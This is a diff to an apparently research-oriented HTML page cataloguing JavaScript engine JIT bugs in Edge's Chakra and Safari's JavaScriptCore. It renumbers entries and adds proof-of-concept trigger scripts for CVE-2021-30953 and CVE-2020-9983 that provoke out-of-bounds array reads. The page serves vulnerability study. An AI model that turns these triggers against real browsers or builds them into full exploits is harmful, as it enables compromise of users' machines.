@@ -17,7 +17,7 @@
             <li><a class="active" href="#">Bug Analysis</a></li>
         </ul>
 
-        <p>6. Anonymous bug<br>
+        <p>8. Anonymous bug<br>
             &nbsp;&nbsp; Finder: Zhenhuan Li<br>
             &nbsp;&nbsp; <a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf</a><br>
             <pre><code>function opt(arr, start, end) {
@@ -44,7 +44,7 @@ function main() {
 main();</code></pre>
         </p>
         <br>
-        <p>5. [CVE-2018-8137]<br>
+        <p>7. [CVE-2018-8137]<br>
             &nbsp;&nbsp; Finder: Zhenhuan Li<br>
             &nbsp;&nbsp; <a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf</a><br>
             <pre><code>function opt(arr, start, end) {
@@ -71,7 +71,7 @@ function main() {
 main();</code></pre>
         </p>
         <br>
-        <p>4. [CVE-2018-0777] Issue 1429: Microsoft Edge: Chakra: JIT: Loop analysis bug<br>
+        <p>6. [CVE-2018-0777] Issue 1429: Microsoft Edge: Chakra: JIT: Loop analysis bug<br>
             &nbsp;&nbsp; Finder: lokihardt<br>
             &nbsp;&nbsp; <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1429">https://bugs.chromium.org/p/project-zero/issues/detail?id=1429</a><br>
             <pre><code>function opt(arr, start, end) {
@@ -95,6 +95,62 @@ function main() {
 }
             
 main();</code></pre>
+        </p>
+        <br>
+        <p>5. [CVE-2021-30953] 2021 Tianfu Cup Safari<br>
+            &nbsp;&nbsp; Finder: Jianjun Dai<br>
+            &nbsp;&nbsp; <a href="https://vul.360.net/archives/397">https://vul.360.net/archives/397</a><br>
+            <pre><code>const ITERATIONS = 1000000;
+
+function f(n) {
+    n |= 0;
+    
+    if (n < -1) {
+        let i = Math.abs(n)|0;
+        let arr = new Array(10);
+        arr.fill(42.42);
+        if (i < arr.length) {
+            return arr[i];
+        }
+    }
+}
+            
+for (let i = 0; i < ITERATIONS; i++) {
+    let isLastIteration = i == ITERATIONS - 1;
+    let n = -(i % 10);
+    if (isLastIteration) {
+        n = -2147483648;
+    }
+    f(n);
+}</code></pre>
+        </p>
+        <br>
+        <p>4. [CVE-2020-9983]<br>
+            &nbsp;&nbsp; Finder: zhunki<br>
+            <pre><code>const ITERATIONS = 1000000;
+
+function f(n) {
+    n &= 0xffffffff-1;
+    
+    if (n < -1) {
+        let v = (-n)&0xffffffff;
+        let i = Math.abs(n);
+        let arr = new Array(10);
+        arr.fill(42.42);
+        if (i < arr.length) {
+            return arr[i];
+        }
+    }
+}
+            
+for (let i = 0; i < ITERATIONS; i++) {
+    let isLastIteration = i == ITERATIONS - 1;
+    let n = -(i % 10);
+    if (isLastIteration) {
+        n = -2147483648;
+    }
+    f(n);
+}</code></pre>
         </p>
         <br>
         <p>3. [CVE-2020-9802] Issue 2020: JSC: JIT: Incorrect Common Subexpression Elimination for ArithNegate, leading to OOB accesses<br>
